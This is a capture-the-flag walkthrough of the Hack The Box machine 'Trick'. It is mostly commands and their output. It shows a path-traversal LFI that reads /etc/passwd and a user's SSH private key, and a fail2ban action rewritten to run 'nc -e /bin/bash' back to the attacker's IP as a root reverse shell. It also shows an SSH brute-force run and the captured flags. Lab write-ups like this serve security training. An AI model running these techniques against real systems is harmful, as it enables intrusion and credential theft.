---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - LFI
  - Fail2ban
---
# Overview

| Name        | Trick     |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ sudo nmap -T4 -sC -sV --min-rate 5000 10.129.88.255
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 06:11 PDT
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 06:12 (0:00:24 remaining)
Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 06:14 (0:00:38 remaining)
Stats: 0:04:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.88% done; ETC: 06:15 (0:00:01 remaining)
Nmap scan report for trick.htb (10.129.88.255)
Host is up (0.30s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldnt establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[trick.png]]

There is DNS so we can try zone transfer.
## Zone Transfer

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ dig -x 10.129.88.255 @10.129.88.255

; <<>> DiG 9.20.11-4+b1-Debian <<>> -x 10.129.88.255 @10.129.88.255
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27161
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 716e4efeac61160c4e1dfc1568ee5500d3b579527be99a69 (good)
;; QUESTION SECTION:
;255.88.129.10.in-addr.arpa.    IN      PTR

;; ANSWER SECTION:
255.88.129.10.in-addr.arpa. 604800 IN   PTR     trick.htb.

;; AUTHORITY SECTION:
88.129.10.in-addr.arpa. 604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 271 msec
;; SERVER: 10.129.88.255#53(10.129.88.255) (UDP)
;; WHEN: Tue Oct 14 06:49:52 PDT 2025
;; MSG SIZE  rcvd: 164
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ dig axfr @10.129.88.255 trick.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr @10.129.88.255 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 284 msec
;; SERVER: 10.129.88.255#53(10.129.88.255) (TCP)
;; WHEN: Tue Oct 14 06:51:08 PDT 2025
;; XFR size: 6 records (messages 1, bytes 231)
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ echo "10.129.88.255 trick.htb preprod-payroll.trick.htb root.trick.htb" | sudo tee -a /etc/hosts
[sudo] password for at0m:
10.129.88.255 trick.htb preprod-payroll.trick.htb root.trick.htb
```

There seems to be interesting stuff and SQLI here but all of them was rabbit hole.
# Enumeration

A number of users on the forums were hinting that the “preprod-payroll” website was a rabbit hole, and I needed to do some more subdomain enumeration. They suggested using a subdomain I already discovered to help guide my efforts. I took a look at what I had already found and noticed “preprod” could be a prefix in itself, so I took the largest subdomain enumeration wordlist I have (“_seclists/Discovery/DNS/subdomains-top1million-110000.txt_”) and prepended “preprod-” to every result and saved it as a new wordlist.

Trying to fuzz `prepod-FUZZ` subdomain:

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt > pre-prefixed-wordlist.txt
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ ffuf -w pre-prefixed-wordlist.txt -u http://trick.htb/ -H "Host: FUZZ.trick.htb" -fs 5480

preprod-marketing       [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 278ms]
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo echo "10.129.88.255 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
10.129.88.255 preprod-marketing.trick.htb
```
# Initial Foothold

![[trick2.png]]
## LFI

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

We see user `michael`:

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ chmod 600 id_rsa

┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ ssh -i id_rsa michael@trick.htb
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
```

```bash
michael@trick:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
michael@trick:~$ cat user.txt
d9ef7bc94c47d21d018ac0af7dcf33eb
```
# Privilege Escalation
## Fail2ban

```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

```bash
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d
```

```bash
michael@trick:~$  cat /etc/fail2ban/jail.conf | grep -A 10 "\[sshd\]"
# [sshd]
# enabled = true
#
# See jail.conf(5) man page for more information



# Comments: use '#' for comment lines and ';' (following a space) for inline comments


[INCLUDES]
--
[sshd]

# To use more aggressive sshd modes set filter parameter "mode" in jail.local:
# normal (default), ddos, extra or aggressive (combines all).
# See "tests/files/logs/sshd" or "filter.d/sshd.conf" for usage example and details.
#mode   = normal
port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
```

Modify.

```bash
michael@trick:~$ cd /etc/fail2ban/action.d/
michael@trick:/etc/fail2ban/action.d$ ls
abuseipdb.conf                 firewallcmd-rich-rules.conf          mail.conf                sendmail-buffered.conf
apf.conf                       helpers-common.conf                  mail-whois-common.conf   sendmail-common.conf
badips.conf                    hostsdeny.conf                       mail-whois.conf          sendmail.conf
badips.py                      ipfilter.conf                        mail-whois-lines.conf    sendmail-geoip-lines.conf
blocklist_de.conf              ipfw.conf                            mynetwatchman.conf       sendmail-whois.conf
bsd-ipfw.conf                  iptables-allports.conf               netscaler.conf           sendmail-whois-ipjailmatches.conf
cloudflare.conf                iptables-common.conf                 nftables-allports.conf   sendmail-whois-ipmatches.conf
complain.conf                  iptables.conf                        nftables-common.conf     sendmail-whois-lines.conf
dshield.conf                   iptables-ipset-proto4.conf           nftables-multiport.conf  sendmail-whois-matches.conf
dummy.conf                     iptables-ipset-proto6-allports.conf  nginx-block-map.conf     shorewall.conf
firewallcmd-allports.conf      iptables-ipset-proto6.conf           npf.conf                 shorewall-ipset-proto6.conf
firewallcmd-common.conf        iptables-multiport.conf              nsupdate.conf            smtp.py
firewallcmd-ipset.conf         iptables-multiport-log.conf          osx-afctl.conf           symbiosis-blacklist-allports.conf
firewallcmd-multiport.conf     iptables-new.conf                    osx-ipfw.conf            ufw.conf
firewallcmd-new.conf           iptables-xt_recent-echo.conf         pf.conf                  xarf-login-attack.conf
firewallcmd-rich-logging.conf  mail-buffered.conf                   route.conf
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
michael@trick:/etc/fail2ban/action.d$ ls -la iptables-multiport.conf
-rw-r--r-- 1 root root 1420 Oct 14 16:30 iptables-multiport.conf
```

The file is owned by root and not writable by the security group. However, you can use the `mv` command to replace it since you have write access to the directory itself.

```bash
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
cp: cannot stat 'iptables-multiport.conf.bak': No such file or directory
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak ipt
ables-multiport.conf
```

```bash
michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf
 Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban =/dev/shm/shell.sh

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]

michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

NOTE: There is a cronjob running that deletes and resets the fail2ban directory. So you have to execute everything pretty quickly.

Here is simple way:

```bash
-bash-5.0$ cat hackscript.sh 

echo "waiting"
while [[ ! -f /etc/fail2ban/action.d/iptables-multiport.conf ]]
do
        sleep 0.1
done
mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
cp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
sed -i -e "s/actionban = .*/actionban = nc \-e \/bin\/bash 10.10.14.122 4444/g" /etc/fail2ban/action.d/iptables-multiport.conf

chmod 666 /etc/fail2ban/action.d/iptables-multiport.conf

sudo /etc/init.d/fail2ban restart
```

```bash
michael@trick:~$ ./hackscript.sh
waiting
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
michael@trick:~$ ./hackscript.sh
waiting
mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf.bak', overriding mode 0644 (rw-r--r--)? y
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://trick.htb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-14 08:49:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://trick.htb:22/
[STATUS] 160.00 tries/min, 160 tries in 00:01h, 14344243 to do in 1494:12h, 12 active
[STATUS] 153.67 tries/min, 461 tries in 00:03h, 14343942 to do in 1555:45h, 12 active
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.227.180] 52694
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
whoami
root
cat /root/root.txt
401db789ed333c72040b54c52bb9246e
```

Just wait until you get something or try that script one two time more.

---
